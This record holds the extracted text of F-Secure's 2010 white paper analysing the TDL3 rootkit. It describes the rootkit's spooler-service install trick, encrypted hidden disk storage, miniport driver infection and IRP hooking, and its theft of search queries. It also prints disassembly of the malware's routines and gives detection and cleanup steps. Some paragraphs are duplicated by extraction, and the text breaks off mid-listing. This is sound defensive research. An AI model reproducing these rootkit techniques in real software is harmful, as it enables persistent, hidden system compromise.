{
    "id": "897faa31-d2f4-4747-afd3-1cd9995d2f67",
    "created_at": "2022-10-25T16:48:14.190221Z",
    "updated_at": "2025-03-27T02:06:07.049156Z",
    "deleted_at": null,
    "sha1_hash": "d28b24b3334b77323b3b7875778b30d11a8f667f",
    "title": "The Case of TDL3",
    "authors": "",
    "file_creation_date": "2010-06-28T15:25:48Z",
    "file_modification_date": "2010-06-28T15:25:48Z",
    "file_size": 1773105,
    "plain_text": "## F-Secure White Paper June 2010\n\n\n# The Case of TTrojan DownLoader \"TTDL3\"\n\n## AAnalysis By: Acee Portuguez F-SSecure Labs\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### II. Contents\n\n I.  Title Page     1\n\n II. Contents     2\n\n III. List of Figures     4\n\n IV. Introduction     5\n\n V. Overview     6\n\n V.1. Building a Foundation     6\n\n V.2.  Installation Technique and Design     7\n\n V.2.1. No Turning Back (Installation Cleanup)     8\n\n V.2.2. Missing piece of the puzzle (Surviving Reboot)     8\n\n V.3. Filtering Concept     9\n\n V.4. Attempt for P2P    10\n\n V.5. Data Synchronization    10\n\n V.6. Payload Modules    12\n\n V.6.1 BOT Client    12\n\n V.6.2 TDL and SEO Attacks    12\n\n V.7. Detection and Clean Up    14\n\n V.7.1. Signs of Infection    14\n\n V.7.2.  Disinfection    15\n\n V.8. Conclusion    16\n\n VI. Technical Description    16\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n2 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### VI.1. Installer /Dropper    16\n\n VI.2. Spooler Injector    17\n\n VI. 2.1. Import Function Patching    20\n\n VI. 2.2. Retrieving Unpacked Binaries    21\n\n VI. 2.3. Executable Image Loader    21\n\n VI.3. Rootkit Driver    22\n\n VI.4. Driver Infection    22\n\n VI.5. IRP Function Wrapper    23\n\n VI.6. IRP Handler    24\n\n VI.7. Content Filtering    25\n\n VI.7.1 Protecting the Miniport Driver from Defragmentation    32\n\n VI.8. File Caching    33\n\n VI.9. Infected Driver Code (Loader)    35\n\n VI.10. Process Injection    39\n\n VI.11. Worker Threads and KAD Protocol    42\n\n VI.12. Related Works and References    53\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n3 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### III. List of Figures\n\n Figure I. TDL3 Execution Flowchart     6\n\n Figure II. Malware Filtering    9\n\n Figure III. Global Data Access    11\n\n Figure IV. Monitoring Search Page Queries    13\n\n Figure V. Encrypted Data(Figure V) Sent to Malware Server    14\n\n Figure VI. Logging Search Queries To its FIleSystem    1\n\n Figure VII. Exploiting Spooler Service (Disassembly) 17-19\n\n Figure VIII. Import Patching (Disassembly)    21\n\n Figure IX. Patched IRP Major Function    23\n\n Figure X. IRP Hook Wrapper (Disassembly)    24\n\n Figure XI. Protected Sector Mapping    25\n\n Figure XII. Filtering SCSI Read and Write (Disassembly)    26\n\n Figure XIII. Initializing Completion Routine (Disassembly)    27\n\n Figure XIV. Completion Routine and Content Forgery (Disassembly)  28-32\n\n Figure XV. Disinfection and File Caching    34\n\n Figure XVI. Loader Code (Disassembly)  35-38\n\n Figure XVII. LoadImageNotify Handler (Disassembly)  39-41\n\n Figure XVIII. Early KAD Funtionalities (Disassembly)  42-51\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n4 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### IV. Introduction\n\n Current trends in the Threat Landscape dictate that a malware’s functionality grow in number, perform more stealthily and increase in complexity. This continuous evolution is a known fact in the industry as Operating Systems improve and Network security tightens.\n\n Naturally, a malware analyst who regularly encounters a malware family will be able to observe the changes between an old variant and a new one, and so note the increase and changes in behaviors. Commonly observed changes seen in more recent malwares are: the addition of code polymorphism, implementation of process hooks and injections; experimentation with new ways to gain privilege escalation; and using rootkit functionalities. \n\n There are however some malware that go a step further. In early 2008, a first-of-its-kind malware was seen – \n\n Mebroot (http://www.f-secure.com/weblog/archives/vb2008_kasslin_florio.pdf), which incorporated some of the most advanced techniques seen in a malware. The aspect with the greatest potential for impacting the threat landscape is the underlying concept the Mebroot malware family represents; a framework or foundation, which we may call a Malware Operating System (in reference to a ‘MaOS’ text string found in the malware). \n\n TDL3, so named by the malware authors themselves, adopts some characteristics of Mebroot malware family in terms of disk infection and surviving reboot operations. Although it does not rank as the most complicated malware seen, TDL3’s distinctive features – stealthy infection mechanisms and tricky removal - should not be overlooked. Moreover, TDL3 is just a framework for further system compromise. \n\n In few simple words, TDL3 is a \"Means to an End”.\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n5 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### V. Overview\n V.1 Building a Foundation\n TDL3’s installation is multi-stage: the Installer is executed; a DLL is loaded; Code is injected; a Service is started; a Driver loaded; Hooks are set in place; and finally, Modules are injected. Once these stages are completed, the system is, needless to say, compromised.\n\n Figure I TDL3 Execution Flowchart\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n6 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Distributed mainly as a single executable file, the installation revolves around appropriately loading the components embedded in the installer, one by one. Each component typically handles certain aspects of the installation, as well as preparing the system for the next component to be loaded.\n V.2 Installation Technique and Design\n Appropriate privileges are a must for successful installation and needless to say, TDL3 has this covered pretty well. Exploiting a common system behavior, the malware will morph itself and use the spooler service. Doing this allows it to bypass HIPS installed in the system. With sufficient privileges and bypass features, loading the Driver component – is now made possible.\n Unlike most rootkit families/drivers, in which the Driver component exist as a file holding the Executable structures intact, TDL3’s Driver component is merely a shell to simply install/write its code section at the end of the disk.  \n By design, TDL3 follows Mebroot’s Disk-Storage scheme, i.e. storing related malware components and data at the end of the physical disk. Information stored in these last sectors includes (but is not limited to): the configuration file; payload components; stolen information; and the Driver’s code sections. All these components and data are encrypted using a RC4 algorithm. \n TDL3 driver however goes the extra mile by implementing its own ‘Encrypted File System’. This adds additional security and integrity to data retrieval when reading the sectors at the end of the disk. Stolen information and the Driver component’s code are stored in the last sectors. Meanwhile, the EXE, DLL and configuration files are organized using a simple ‘private file system’: a list of files is stored in a ‘Directory’- type listing marked in the disk with ‘TDLD’ (TDL Directory), with a filename and offset indicating the location of the file content; while the corresponding file contents are marked as ‘TDLF’ (TDL File).\n Protecting this ‘file system’ is done in three parts. First, the stored data is directly encrypted using a RC4 algorithm with a private key string, which in this case is a 256- byte long ‘tdl’ string. Second, at each execution (after reboot), the malware generates a global random string which is only known to the malware and its components, to be\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n7 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### used when accessing the ‘file system’. And the third, the malware uses hooks to protect these sectors from direct access.\n V.2.1 No Turning Back\n To protect itself from early detection and to conceal signs of infection, the malware implements clean up routines, erasing any traces of execution or existence in the system. Associated files and registry entries are deleted, making the infection virtually impossible to notice.\n V.2.2 Missing piece of the puzzle\n Of course, installation would not be complete without ensuring that a mechanism for continuous and effective autostart is in place. Autostart or merely surviving reboot is always a race condition – simply put, to protect itself, most advance malwares will ensure they are executed first before any other drivers, including antivirus scanners, are loaded. \n To survive reboot and win the loading race, TDL3 infects the lowest disk filter driver to contain the loader stub, ensuring the malware is fully operational when the system is loaded.\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n8 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### V.3 Filtering Concept\n\n Figure II Malware Filtering \n Acting in the lowest level of disk filter driver, TDL3 successfully ‘hooks’ or intercepts accesses to a list of protected sectors. The malware hooks are responsible for two things: allowing direct access to the disk for malware components; and filtering content access to the disk by other processes thus helping the malware hide its presence on the system.\n TDL3 uses two methods to intercept access. In the first method, TDL3 maintains a list of physical addresses for infected sectors, as well as a corresponding fake mapping of the original clean sectors in its memory. When any attempt is made to access the infected sectors, the malware will overwrite the (infected) data read with clean data stored in memory. This listing is primarily used to protect the infected disk filter driver\n\n\n#### V.3 Filtering Concept\n\n Figure II Malware Filtering \n Acting in the lowest level of disk filter driver, TDL3 successfully ‘hooks’ or intercepts\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n9 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### from being accessed, as the malware’s own file system and the malware data stored at the end of the disk are already protected.\n The second tactic is simpler, as any read/write access requests to the last disk sectors that do not come from the malware will be presented with filtered content. To filter, the read data in memory to be returned to the calling process is zero-filled thus giving back a clean memory buffer.\n\n V.4 Attempt for P2P\n\n The first variants that appeared in this growing family originally included thread functions in the driver code for Peer-to-Peer (P2P) communication via TDI interface, using the Kademlia protocol. Kademlia-based DHT protocol (KAD) is known as the most widest used DHT-base protocol, so its choice comes to no surprise. Normally, this protocol is used to send messages between peers, as well as for file uploads and downloads. Its use here is perhaps an attempt to push malware updates? \n\n From the samples analyzed, this functionality is unlikely to perform correctly as the implementation lacks several key KAD function handlers. At the time, this led us to conclude that its inclusion was a premature attempt at using P2P. We may have been right, as the latest samples seen no longer contain the P2P functionality. The question is however, is that a good thing? Or has P2P functionality was improved and completed and just been transferred to a new module which is to be downloaded later?\n\n V.5 Data Synchronization\n TDL3 maintains a set of global data variables that is accessible by several different components and threads, ensuring that the separate processes use synchronized data during execution. \n To store the global information, the malware utilizes the KUSER_SHARED_DATA region in memory. The KUSER_SHARED_DATA structure starts at 0xFFDF0000 and is 0x340 bytes long. TDL3 modifies the entry KUSER_SHARED_DATA- >SystemCallPad (0xFFDF0308) to point to an allocated buffer (which will be subsequently referred to as Malware_Shared_Buffer) in memory, an area that all components can access.\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n10 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Figure III Global Data Access\n The information contained in the Malware_Shared_Buffer area includes, but is not limited to, the following:\n • A pointer to the allocated buffer that contains the stolen resource data from the infected disk filter driver, as well as a copy of the malware code section \n • Base address of kernel\n • Device object handle responsible for IDE/Disk device\n • Offset in the disk, indicating where the stolen information is written \n • MachineGUID (used by the malware as a unique botid)\n • Copy of all the Original Addresses for the disk filter driver’s IRP Major Functions \n • Pointer to the malware’s IRP Hook Handler\n • Driver and Device object associated to the infected driver\n • Address of kernel32!LoadLibrary used in DLL injection\n • Randomly generated string – used to access files in the malware-protected sectors \n • Complete path to access the malware private file system\n • Other portions of this buffer are used for temporary variables, SCSI_REQUEST_BLOCK structure, IRP structure etc…\n\n\n#### Figure III Global Data Access\n The information contained in the Malware_Shared_Buffer area includes, but is not limited to, the following:\n • A pointer to the allocated buffer that contains the stolen resource data from the\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n11 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### V.6 Payload Modules\n\n The main TDL3 installer file contains two payload modules:\n\n • TDLwsp.dll\n • TDLcmd.dll\n\n These modules are injected into specific processes, as indicated in a log or configuration file. Module injection is carried out in kernel by creating a LoadImageNotify handler to intercept process execution. The handler will execute an APC which will create a worker routine that will be finally responsible for running LoadlibraryExA as another APC with the payload module name written in the memory context of the target process.\n\n V.6.1 BOT Client\n\n TDLcmd is injected into the svchost process and functions as a bot by connecting to a malware-defined Command & Control (C&C) server. The address it connects to may be sourced from either the configuration file or an address hardcoded in its body, whichever is the latest. The main function of this module appears to be downloading files onto the system.\n\n V.6.2 TDL and SEO Attacks \n\n Meanwhile, TDLwsp is injected into any launched process and once loaded, will focus mainly on web browser processes by checking the following strings:\n\n • *explore*\n • *firefox*\n • *chrome*\n • *opera*\n • *safari*\n • *netscape*\n • *avant*\n • *browser*\n If any of the strings are found, TDLwsp will hook the process’ WSPRecv, WSPSend and WSPCloseSocket APIs from the mswsock module. By injecting through these browser applications, TDLwsp becomes capable of passing through system firewalls. It can thus also manipulate the browser’s browsing history and search pages and\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n12 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### gain the capacity to download an update for itself – without arousing suspicion in the user. \n Latest variants have now properly implemented this. While browsing, it monitors input search queries in on popular search engines and websites such as, Google, Yahoo, AOL, Ask, Bing, Live, Msn, Youtube etc… TDLwsp = (TDL [W]atcher [S]earch\n [P]ages)?\n Monitored queries are then stored by the malware in its ‘file system’ as the file ‘keywords’. Moreover, queried phrases are then immediately sent to its controlled server together with BotId, Bot version, date in an encrypted form to avoid immediate detection. Allowing the attacker to poison future search queries of the user or use the gathered keywords to compute its own statistics for commonly search phrases at the time allowing remote attackers to effectively launch a SEO poisoning attack.\n\n Figure IV Monitoring Search Page Queries\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n13 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Figure V Encrypted Data (Figure V) Sent to Malware Server\n\n Figure VI Logging Search Queries To its FileSystem\n\n V.7 Detection and Clean UP\n\n V.7.1 Signs of Infection\n As with most rootkits, signs of system infection are hard to find without the aid of some tools. One easy way to identify infection is by checking “explorer”, or any other process mentioned above, to see if a tdlwsp.dll has been injected in it (this may be done using SysInternals’ ProcessExplorer.exe). Actively monitoring network connections for packets involving unknown file downloads may also help in pinpointing possible infection. Moreover, active payload\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n14 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### modules can be seen with an internet browser open and checking for the mutex CC51461B-E32A-4883-8E97-E0706DC65415.\n Alternatively, since the infected miniport driver is protected by the malware during a live system infection, this protection can be circumvented by performing offline scanning, whether through a clean system or by booting with a clean disk or via the recovery console. During offline mode, users can also check for malicious information stored at the end of the disk.\n For more advanced investigators, infection can be identified by checking the disk miniport driver’s IRP Handler for the presence of a possible HOOK wrapper. Furthermore, the KUSER_SHARED_DATA can be checked to see if the malware entry is present; this can be done programmatically or by using available tools or debuggers.\n V.7.2 Disinfection \n Perhaps the weakest link in the malware’s operations, which can thus be exploited for cleanup, is the infected disk filter or Miniport driver. As it is the starting point of the infection process when the system is rebooted, disinfecting this module first then reboot, it will guarantee the other malware components still present on the disk will no longer be able to execute.\n Should the technology support this, the following is the ideal cleanup process for an infected system:\n � Read the malware’s Common buffer and retrieve all information needed � Restore IRP Hooks � Remove the injected components � Disinfect the Miniport driver � Clear malware-related data/buffers from the KUSER_SHARED_DATA memory entry, as well as other buffers\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n15 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### V.8 Conclusion\n\n Aside from some similarities from the old TDSS backdoor malwares, TDL3 is not the new TDSS as claimed by the malware authors in TDL3’s code, \n\n What do we know about TDL3? It operates in low level as well as user mode via different components. Loading and execution are multi-stage operations. Startup and system infection properties are similar to Mebroot rootkits in that it writes its copy and associated data directly to the end of the disk. It infects the Miniport driver associated with the disk device to enable its own automatic and early execution. It has bot functionality, which is carried out by the DLL component as well as the driver. Payloads, so far, are geared towards downloading data/files.\n\n So just what is TDL3? TDL3 is a \"means to an end”, a malware framework, a foundation for complete system compromise. What TDL3 offers is not just stealth coverage or complex installation, but a functional platform for pushing unknown malware onto the system. Through its stealth mechanisms, TDL3 protects the ‘pushed’ malwares; while its complexity prevents the malwares from being removed easily. \n\n VI. Technical Description\n VI.1. Installer /Dropper\n It is important to note that TDL3’s installer file exists in both EXE and DLL form. The difference between the two involves the amount of data to be decrypted and unpacked. \n The installer typically contains five (5) packed and encrypted data which are embedded within the executable form of the installer file. The start of the data is directly referenced in the following file:\n • IMAGE_FILE_HEADER.PointerToSymbolTable \n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n16 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### The data is embedded as adjacent structures of:\n Struct EmbedData {   Long dwSize;   Char DATA [dwSize]; };\n When the EXECUTABLE file is launched, it will only load one of the embedded data; by contrast, the DLL version will load and unpack all the data.\n Normal installation starts with the EXECUTABLE version of the installer file. When executed, the file first checks to determine which mode of execution it will perform; it then loads, unpacks and executes an image file. \n VI.2 Spooler Injector\n Once the unpacked image is executed, the installer file will pass control to it, but not before the following is first checked: Is the unpacked image from the EXE or DLL version of the installer?\n The major routines at this stage require that the unpacked image come from the DLL version of the Installer. If the image is from the EXE version, executing the image causes it to patch itself and create a DLL version of the Installer in a temporary (tmp) file in the print spooler directory (%Systemroot%\\system32\\spool\\prtprocs\\[platformdir]). \n Subsequently, calling the AddPrintProcessor triggers the spooler to locate and load any associated DLL s stored in its print processor directory thereby executing the DLL version of the Installer in the context of the spooler service. Alternatively, new variants use AddPrintProvidor to do the same.\n\n.text:022814DE         lea   eax, [ebp+68h+arg_0+3]\n.text:022814E1         push  eax       ; ptr enabled\n.text:022814E2         push  ebx       ; current thread\n.text:022814E3         push  1        ; enable\n.text:022814E5         push  0Ah       ; privelege\n.text:022814E7         call  ds:RtlAdjustPrivilege\n.text:022814E7\n.text:022814ED         lea   eax, [ebp+68h+hObject]\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n17 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:022814F0         push  eax       ; pcbNeeded\n.text:022814F1         mov   esi, 104h\n.text:022814F6         push  esi       ; cBuf\n.text:022814F7         lea   eax, [ebp+68h+printdirpath]\n.text:022814FD         push  eax       ; PrintProcessorInfo\n.text:022814FE         push  1        ; Level\n.text:02281500         push  ebx       ; pEnvironment\n.text:02281501         push  ebx       ; pName\n.text:02281502         call  jGetPrintProcessorDirectoryA@24 ;\nwinspool.drv\n.text:02281502                     ;\n_GetPrintProcessorDirectoryA@24\n.text:02281502\n.text:02281507         lea   eax, [ebp+68h+tempfilename]\n.text:0228150D         push  eax       ; lpTempFileName\n.text:0228150E         push  ebx       ; uUnique\n.text:0228150F         push  ebx       ; lpPrefixString\n.text:02281510         lea   eax, [ebp+68h+printdirpath]\n.text:02281516         push  eax       ; lpPathName\n.text:02281517         call  ds:GetTempFileNameA\n.text:02281517\n.text:0228151D         push  esi       ; nSize\n.text:0228151E         lea   eax, [ebp+68h+printdirpath]\n.text:02281524         push  eax       ; lpFilename\n.text:02281525         push  ebx       ; hModule\n.text:02281526         call  ds:GetModuleFileNameA\n.text:02281526\n.text:0228152C         push  ebx       ; bFailIfExists\n.text:0228152D         lea   eax, [ebp+68h+tempfilename]\n.text:02281533         push  eax       ; lpNewFileName\n.text:02281534         lea   eax, [ebp+68h+printdirpath]\n.text:0228153A         push  eax       ; lpExistingFileName\n.text:0228153B         call  ds:CopyFileA\n.text:0228153B\n.text:02281541         push  ebx       ; hTemplateFile\n.text:02281542         push  ebx       ; dwFlagsAndAttributes\n.text:02281543         push  3        ;\ndwCreationDisposition\n.text:02281545         push  ebx       ; lpSecurityAttributes\n.text:02281546         push  1        ; dwShareMode\n.text:02281548         push  FILE_ALL_ACCESS ; dwDesiredAccess\n.text:0228154D         lea   eax, [ebp+68h+tempfilename]\n.text:02281553         push  eax       ; lpFileName\n.text:02281554         call  ds:CreateFileA\n.text:02281554\n.text:0228155A         mov   edi, eax\n.text:0228155C         cmp   edi, INVALID_HANDLE_VALUE\n.text:0228155F         jz   short loc_22815DE\n.text:0228155F\n.text:02281561         push  ebx       ; lpModuleName\n.text:02281562         call  ds:GetModuleHandleA\n.text:02281562\n.text:02281568         push  eax       ; pPrintProcessorName\n.text:02281569         mov   [ebp+68h+hKey], eax\n.text:0228156C         call  ds:RtlImageNtHeader\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n18 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:0228156C\n.text:02281572         mov   esi, eax\n.text:02281574         sub   eax, [ebp+68h+hKey]\n.text:02281577         push  ebx       ; dwMoveMethod\n.text:02281578         push  ebx       ; lpDistanceToMoveHigh\n.text:02281579         add   eax, 16h\n.text:0228157C         push  eax       ; lDistanceToMove\n.text:0228157D         push  edi       ; hFile\n.text:0228157E         call  ds:SetFilePointer ; Characteristic\nField\n.text:0228157E\n.text:02281584 /*\n.text:02281584  Changes the characteristics of the copy to DLL\n.text:02281584 */\n.text:02281584         mov   ax,\n\n[esi+_IMAGE_NT_HEADERS.FileHeader.Characteristics]\n.text:02281588         or   ax, IMAGE_FILE_DLL\n.text:0228158C         movzx  eax, ax\n.text:0228158F         push  ebx       ; lpOverlapped\n.text:02281590         mov   [ebp+68h+Buffer], eax\n.text:02281593         lea   eax, [ebp+68h+hObject]\n.text:02281596         push  eax       ;\nlpNumberOfBytesWritten\n.text:02281597         push  2        ;\nnNumberOfBytesToWrite\n.text:02281599         lea   eax, [ebp+68h+Buffer]\n.text:0228159C         push  eax       ; lpBuffer\n.text:0228159D         push  edi       ; hFile\n.text:0228159E         call  ds:WriteFile  ; change to DLL\n.text:0228159E\n.text:022815A4         push  edi       ; hObject\n.text:022815A5         call  ds:CloseHandle\n.text:022815A5\n.text:022815AB         push  offset aTdl   ; \"tdl\"\n.text:022815B0         lea   eax, [ebp+68h+tempfilename]\n.text:022815B6         push  eax       ; pszPath\n.text:022815B7         call  ds:PathFindFileNameA\n.text:022815B7\n.text:022815BD         push  eax       ; pPathName\n.text:022815BE         push  ebx       ; pEnvironment\n.text:022815BF         push  ebx       ; pName\n.text:022815C0         call  j_AddPrintProcessorA@16\n\n#### Figure VII Exploiting Spooler Service\n Once the DLL Installer is executed in the spooler service, it will decrypt all the embedded data and load them in the system:\n • Driver\n • TDLwsp.dll\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n19 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### • TDLcmd.dll\n • List of C&C server\n • Id\n The Driver will then be loaded with necessary registry service information set (tdlserv). \n The malware will also create the file config.ini to contain the basic information needed for infection. The file contains the following:\n [main] botid = [machineguid] affid = (1002) subid = (0) installdate = [systemdate]\n [injector] svchost.exe = tdlcmd.dll\n * = tdlwsp.dll (* -> any process)\n [tdlcmd] servers = \n\n Details of the config.ini will be discussed in the following sections. Once the config.ini file is set, TDLcmd.dll will be loaded into memory for continued execution.\n VI.2.1 Import Function Patching\n It is interesting to note the way the Installer attempts to obfuscate the call to the unpacking routine – namely, by patching its own Import table and calling the corresponding API (e.g., SetEvent) for the address in the table. As such, when viewed in a disassembler for static analysis, the malware’s action appears to be a normal call to an API, even though it is actually a call to the unpacking routine. \n\n.text:004013AC         push  eax\n.text:004013AD         mov   [ebp+var_30], 'S'\n.text:004013B1         mov   [ebp+var_2F], 'e'\n.text:004013B5         mov   [ebp+var_2E], 't'\n.text:004013B9         mov   [ebp+var_2D], 'E'\n.text:004013BD         mov   [ebp+var_2C], 'v'\n.text:004013C1         mov   [ebp+var_2B], 'e'\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n20 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:004013C5         mov   [ebp+var_2A], 'n'\n.text:004013C9         mov   [ebp+var_29], 't'\n.text:004013CD         mov   [ebp+var_28], 0\n.text:004013D1         call  FindAPIByHash_PatchSetEvent ;\n\n#### . .\n\n.text:00401AD3\n.text:00401AD5         mov   edi, eax\n.text:00401AD7         push  edi\n.text:00401AD8         push  [esp+10h+hEvent] ; hEvent\n.text:00401ADC         mov   eax, ds:SetEvent]\n.text:00401AE3         call  eax ; SetEvent ; unpacking\ncode -- uses aPlib compression\n\n#### Figure VIII Import Patching\n VI.2.2 Retrieving Unpacked Binaries\n Subsequent execution of the two user mode components (TDLwsp.dll and TDLcmd.dll) follows the same decryption and unpacking routine as the initial Installer. Across the different components, similar code is seen as shown in Figure IV. The address of the unpacked module is returned after the call to the patched API.\n The same technique is also utilized by Driver component, with the exception of the target API to patch, which may vary. At the time of writing, the Driver uses the API RtlAppendAsciizToString. VI.2.3 Executable Image Loader\n As the unpacked images in memory are file images, the malware uses its own loader to map and execute them. Execution involves proper memory mapping, fixing of import and export tables and fixing or updating relocationable items. This also includes fixing and updating such resource information as it is needed by the new image for proper execution.\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n21 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### VI.3 Rootkit DRIVER\n The malware’s Driver is critical because all other components require it to have been already loaded in order to successfully execute.\n VI.4 Driver Infection\n When executed, the Driver’s initial task is to infect the filter driver or Miniport driver associated with the disk device. It does so by overwriting certain bytes in the Miniport’s resource section with its own Loader code. The stolen resource is then stored in the same buffer as the Driver’s code.\n Execution of the buffered code is the final stage of installation and is responsible for starting the necessary threads and hooks for complete system infection. Both the stolen resource and the Driver code are subsequently written to the disk’s raw sectors.\n Also, to control access to disk sectors containing malware-related code, TDL3 patches all the Miniport driver’s IRP Major Functions to point to its handler:\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n22 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Figure IX Patched IRP Major Function\n\n VI.5 IRP Function Wrapper\n\n To hook the Miniport driver’s IRP Major Functions, the malware first copies a wrapper code to the end of the driver’s code, then points all the IRP functions to that address. By doing so, the malware ensures the IRP Major Functions are pointed inside the driver rather than to any arbitrary memory address for better stealth. The wrapper looks like:\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n23 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10005586 ATAPI_DRV_OBJ_IRP_PATCH proc near\n.text:10005586         mov   eax, ds:0FFDF0308h\n.text:1000558B         jmp   dword ptr [eax+0FCh]\n.text:1000558B\n.text:1000558B ATAPI_DRV_OBJ_IRP_PATCH endp\n\n#### Figure X IRP Hook Wrapper\n Note: [0FFDF0308h] + 0xFC points to the malware’s IRP Handler Functions\n VI.6 IRP HANDLER\n After the Miniport driver is infected, the malware performs a quick check whenever an IRP Major Function is called. The check is done to ascertain if the path being accessed contains either an exact path or a string matching the one stored in the Malware_Shared_Buffer.\n If the correct path or string is present, it indicates a request for direct access to the malware’s ‘private’ file system. In this case, the malware will check if the IRP function called is any of the following: \n\n • IRP_MJ_CREATE\n • IRP_MJ_CLOSE\n • IRP_MJ_QUERY_INFORMATION\n • IRP_MJ_SET_INFORMATION\n • IRP_MJ_READ\n • IRP_MJ_WRITE\n • IRP_MJ_QUERY_VOLUME_INFORMATION\n If so, the malware performs the necessary routines to read the requested data, as well as performing all the parsing and decryption for the calling process. \n Essentially, as long as a calling process contains the exact path or the malware- generated string, any attempt to access the malware’s file system will be performed by the malware and successfully completed. \n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n24 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### If the request does not include the correct path or string, the malware will perform another check to determine if ‘content filtering’ should be implemented. \n\n VI.7 Content Filtering \n Content filtering is the malware’s response to attempts to access specific protected disk sectors:\n\n Figure XI Protected Sector Mapping\n When verifying a disk request, this array of structure is enumerated and checked. If a disk access request does not touch these sectors, it is allowed to proceed; if the request is directed against any of the sensitive sectors, the requested data is modified or disinfected to hide the malware’s presence on the disk.\n To determine if content filtering should be applied, the access request is first checked for SRB_FUNCTION_EXECUTE_SCSI, with flags SRB_FLAGS_DATA_IN and SRB_FLAGS_DATA_OUT. \n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n25 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10004B61 loc_10004B61:            ; CODE XREF:\nIRP_HOOK_HANDLER+91j\n.text:10004B61                   ; IRP_HOOK_HANDLER+98j\n.text:10004B61         cmp   [ebx+IO_STACK_LOCATION.MajorFunction],\nIRP_MJ_INTERNAL_DEVICE_CONTROL\n.text:10004B64         jnz   not_scsi_execute\n.text:10004B64\n.text:10004B6A /*\n.text:10004B6A IRP_MJ_INTERNAL_DEVICE_CONTROL\n.text:10004B6A */\n.text:10004B6A         mov   ecx,\n[ebx+IO_STACK_LOCATION.Parameters.Scsi.Srb]\n\n.text:10004B6D         cmp   [ecx+SCSI_REQUEST_BLOCK.Function],\nSRB_FUNCTION_EXECUTE_SCSI\n.text:10004B71         jnz   not_scsi_execute\n.text:10004B71\n.text:10004B77         mov   edi, ds:0FFDF0308h\n.text:10004B7D         mov   eax,\n[ecx+SCSI_REQUEST_BLOCK.DataTransferLength]\n\n.text:10004B80         xor   edx, edx\n.text:10004B82         div   [edi+TDL3.SectorSize]\n.text:10004B88         xor   esi, esi\n.text:10004B8A         mov   edx, edi\n.text:10004B8C         mov   [ebp+srbflags], esi\n.text:10004B8F         add   eax,\n\n[ecx+SCSI_REQUEST_BLOCK.anonymous_0.InternalStatus]\n\n.text:10004B92         cmp   